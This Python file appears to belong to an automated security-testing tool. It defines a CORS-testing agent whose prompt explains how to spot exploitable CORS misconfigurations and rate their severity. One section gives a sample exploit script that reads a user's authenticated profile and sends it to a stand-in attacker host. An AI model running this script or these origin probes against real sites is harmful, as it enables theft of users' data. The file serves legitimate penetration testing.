from core.base_agent import ReasoningAgent
from core.http_client import HTTPClient


class CORSAgent(ReasoningAgent):
    VULN_TYPE = "CORS"
    VULN_PROMPT = """
━━━ YOUR KNOWLEDGE BASE FOR CORS ━━━

WHAT THE RESPONSE HEADERS TELL YOU:
  Access-Control-Allow-Origin: *
    → Wildcard. Any origin can read the response.
    → NOT exploitable if Access-Control-Allow-Credentials is absent or false.
    → The browser will not send cookies with wildcard origins.
    → Only impactful if the endpoint returns sensitive data accessible without auth.

  Access-Control-Allow-Origin: https://evil.com  (your injected origin reflected)
    → The server trusts whatever origin you send.
    → Check immediately: is Access-Control-Allow-Credentials: true also present?
    → If both present → full exploit: cross-origin authenticated requests possible.

  Access-Control-Allow-Credentials: true
    → The server will allow cookies/auth headers cross-origin.
    → This alone is harmless. Only dangerous paired with a reflected or null origin.

  No CORS headers at all
    → The browser will block cross-origin reads. Not directly exploitable via CORS.
    → But check: is this a CORS-sensitive endpoint at all?

WHAT DIFFERENT ORIGIN VALUES REVEAL:
  Origin: https://evil.com
    If reflected back → server trusts arbitrary origins

  Origin: null
    Some servers trust null origin (sandboxed iframes can send null)
    If Access-Control-Allow-Origin: null is returned → exploitable via iframe sandbox

  Origin: https://evil.TARGET.com (subdomain of target)
    If reflected → regex check like /target\.com$/ without anchoring start
    This means any domain ending in target.com is trusted
    Subdomain takeover + this = account takeover

  Origin: https://TARGET.com.evil.com
    If reflected → server checks for prefix match only (starts with target.com)
    e.g.: /^https?:\/\/target\.com/ matches https://target.com.evil.com

  Origin: https://noTARGET.com or https://attackertarget.com
    Tests for suffix matching or contains matching in origin validation

  Origin: https://TARGET.com (exact match)
    Just confirms a non-reflected case — expected behavior

WHAT MAKES A CORS MISCONFIGURATION ACTUALLY EXPLOITABLE:
  The endpoint must return something worth stealing.
  Ask yourself: what does this endpoint return if the user is authenticated?
  /api/user → email, name, profile → Medium/High
  /api/account/tokens → API keys, session tokens → Critical
  /api/export → full data dump → Critical
  /health or /status → nothing sensitive → not worth reporting

  And: does the application use session cookies for authentication?
  If it uses Bearer tokens in Authorization header (not cookies),
  CORS misconfiguration with credentials does not help the attacker
  because Authorization headers require explicit CORS allowance separately.

WHAT TELLS YOU THE REGEX IS BROKEN:
  Test systematically. If origin evil.com is reflected, the check is completely absent.
  If evil-target.com is reflected but evil.com is not → suffix check without anchoring.
  If target.com.evil.com is reflected → prefix check without end anchoring.
  If targetevil.com is reflected → contains check.
  Each tells you the exact nature of the broken validation.

WHAT A REAL EXPLOIT LOOKS LIKE:
  Attacker hosts:
  <script>
    fetch("https://target.com/api/profile", {credentials: "include"})
    .then(r => r.json())
    .then(data => fetch("https://attacker.com/log?d=" + btoa(JSON.stringify(data))))
  </script>
  This works if: target trusts attacker's origin AND allows credentials.

SEVERITY REASONING:
  Reflected origin + credentials: true + sensitive authenticated data → Critical
  Reflected origin + credentials: true + any authenticated data → High
  Wildcard + no credentials + public data → Informational
  Null origin + credentials + sensitive data → High
  Subdomain confusion + credentials + sensitive data → High
"""

    def __init__(self, endpoint: dict, http: HTTPClient):
        super().__init__(endpoint, http)